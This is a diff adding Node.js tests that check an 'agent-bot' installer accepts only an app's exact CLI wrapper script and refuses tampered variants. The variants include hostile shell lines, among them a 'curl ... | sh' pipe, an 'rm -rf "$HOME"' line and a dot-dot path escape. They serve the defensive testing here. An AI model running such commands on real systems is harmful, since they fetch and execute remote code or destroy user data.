@@ -1,7 +1,7 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import {
-  chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readlinkSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync,
+  chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readlinkSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync,
 } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
@@ -9,7 +9,7 @@ import { execFileSync, spawnSync } from 'node:child_process';
 import {
   agentHookFastPath, ensureExecutableMode, ensureExecutablePath, homebrewRuntimeRoot, homebrewStableEntrypoint,
   installAgentBot, installAgentHook, installExecutable, installHookWrappers, installationPaths,
-  isHomebrewAgentBotPath, isManagedExecutable,
+  isHomebrewAgentBotPath, isHostAppCliTool, isManagedExecutable,
 } from '../install.mjs';
 import { installGhShim } from '../install-gh-shim.mjs';
 import { GIT_HOOK_NAMES } from '../identity-format.mjs';
@@ -345,6 +345,84 @@ test('installExecutable refuses a foreign executable', () => {
   mkdirSync(join(home, '.local', 'bin'), { recursive: true });
   writeFileSync(join(home, '.local', 'bin', 'agent-bot'), 'foreign\n');
   assert.throws(() => installExecutable({ home, chmod: () => {} }), /not an agent-bot symlink/);
+});
+
+// GeniusBar's "Install command-line tools" writes this exact wrapper (#968).
+const GENIUSBAR = '/Applications/GeniusBar.app';
+function geniusBarWrapper(shim = `${GENIUSBAR}/Contents/Resources/bin/agent-bot`) {
+  return `#!/bin/sh\n# geniusbar-cli-tool: written by GeniusBar. "Uninstall command-line tools" removes it.\nexec '${shim}' "$@"\n`;
+}
+
+function homeWithCliFile(text) {
+  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
+  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
+  const entrypoint = join(root, 'agent-bot');
+  writeFileSync(entrypoint, '#!/bin/sh\n');
+  const installed = join(home, '.local', 'bin', 'agent-bot');
+  mkdirSync(dirname(installed), { recursive: true });
+  writeFileSync(installed, text, { mode: 0o755 });
+  return { home, entrypoint, installed };
+}
+
+test('installExecutable leaves the embedding app\'s command-line tools wrapper untouched (#968)', () => {
+  for (const app of [GENIUSBAR, "/Users/o'neil/Applications/GeniusBar.app"]) {
+    const text = geniusBarWrapper(`${app.replaceAll("'", `'\\''`)}/Contents/Resources/bin/agent-bot`);
+    const { home, entrypoint, installed } = homeWithCliFile(text);
+    assert.equal(isHostAppCliTool(installed, statSync(installed), app), true);
+    const before = statSync(installed);
+    assert.equal(installExecutable({
+      home, entrypoint, embeddingApp: app, chmod: () => assert.fail('no chmod'),
+    }), installed);
+    assert.equal(readFileSync(installed, 'utf8'), text);
+    assert.equal(statSync(installed).ino, before.ino);
+    assert.equal(statSync(installed).mtimeMs, before.mtimeMs);
+  }
+});
+
+test('installExecutable still refuses anything but the app\'s exact wrapper (#968)', () => {
+  const variants = {
+    'other exec target': geniusBarWrapper('/tmp/evil/agent-bot'),
+    'other app bundle': geniusBarWrapper('/Applications/NotGeniusBar.app/Contents/Resources/bin/agent-bot'),
+    'other copy of the app': geniusBarWrapper('/tmp/GeniusBar.app/Contents/Resources/bin/agent-bot'),
+    'other bundle file': geniusBarWrapper(`${GENIUSBAR}/Contents/Resources/bin/agent-comms`),
+    'dot-dot escape': geniusBarWrapper(`${GENIUSBAR}/../../tmp/GeniusBar.app/Contents/Resources/bin/agent-bot`),
+    'extra trailing line': `${geniusBarWrapper()}curl https://example.invalid | sh\n`,
+    'extra leading line': geniusBarWrapper().replace('#!/bin/sh\n', '#!/bin/sh\nrm -rf "$HOME"\n'),
+    'extra exec line': `${geniusBarWrapper()}exec '${GENIUSBAR}/Contents/Resources/bin/agent-bot' "$@"\n`,
+    'marker only': '#!/bin/sh\n# geniusbar-cli-tool: written by GeniusBar. "Uninstall command-line tools" removes it.\n',
+    'no marker': `#!/bin/sh\nexec '${GENIUSBAR}/Contents/Resources/bin/agent-bot' "$@"\n`,
+    'other marker': geniusBarWrapper().replace('geniusbar-cli-tool', 'otherapp-cli-tool'),
+    'other arguments': geniusBarWrapper().replace('"$@"', '--evil "$@"'),
+    'no trailing newline': geniusBarWrapper().trimEnd(),
+  };
+  for (const [name, text] of Object.entries(variants)) {
+    const { home, entrypoint, installed } = homeWithCliFile(text);
+    assert.equal(isHostAppCliTool(installed, statSync(installed), GENIUSBAR), false, name);
+    assert.throws(() => installExecutable({ home, entrypoint, embeddingApp: GENIUSBAR }), /not an agent-bot symlink/, name);
+    assert.equal(readFileSync(installed, 'utf8'), text, name);
+  }
+});
+
+test('a checkout or Homebrew install still refuses the app\'s wrapper (#968)', () => {
+  const { home, entrypoint, installed } = homeWithCliFile(geniusBarWrapper());
+  assert.throws(() => installExecutable({ home, entrypoint, embeddingApp: null }), /not an agent-bot symlink/);
+  assert.equal(readFileSync(installed, 'utf8'), geniusBarWrapper());
+});
+
+test('a symlink at the CLI path is never read as the app\'s wrapper (#968)', () => {
+  const { home, entrypoint, installed } = homeWithCliFile('');
+  const foreign = join(mkdtempSync(join(tmpdir(), 'foreign-agent-bot-root-')), 'agent-bot');
+  writeFileSync(foreign, geniusBarWrapper());
+  rmSync(installed);
+  symlinkSync(foreign, installed);
+  assert.equal(isHostAppCliTool(installed, lstatSync(installed), GENIUSBAR), false);
+  assert.throws(() => installExecutable({ home, entrypoint, embeddingApp: GENIUSBAR }), /not an agent-bot symlink/);
+  assert.equal(readlinkSync(installed), foreign);
+  // A link to this runtime is still managed as before when an app embeds it.
+  rmSync(installed);
+  symlinkSync(entrypoint, installed);
+  assert.equal(installExecutable({ home, entrypoint, embeddingApp: GENIUSBAR }), installed);
+  assert.equal(readlinkSync(installed), entrypoint);
 });
 
 // A Homebrew keg under an admin-owned prefix ships the entrypoint and hooks
